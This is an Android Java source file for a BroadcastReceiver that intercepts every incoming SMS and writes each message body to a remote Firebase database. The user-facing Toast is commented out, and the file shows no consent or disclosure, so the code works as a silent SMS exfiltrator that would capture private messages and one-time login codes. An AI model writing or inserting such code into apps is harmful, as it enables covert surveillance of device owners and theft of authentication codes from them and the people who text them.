package com.sar.user.message_11;

import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Telephony;
import android.support.v4.view.PagerAdapter;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class Message extends BroadcastReceiver {
    String w;
    FirebaseDatabase firebaseDatabase;
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static final String TAG = "SMSBroadcastReceiver";
    private  Context context;
    @Override
    public void onReceive(Context context, Intent intent) {
       SmsMessage [] smsMessages= Telephony.Sms.Intents.getMessagesFromIntent(intent);
        firebaseDatabase=FirebaseDatabase.getInstance();
        DatabaseReference databaseReference=firebaseDatabase.getReference("message");
       for (SmsMessage sms:smsMessages)
       {
           w=sms.getMessageBody();
          // Toast.makeText(context,w.toString(),Toast.LENGTH_SHORT).show();
           databaseReference.child(w).setValue(w);
       }

    }
}
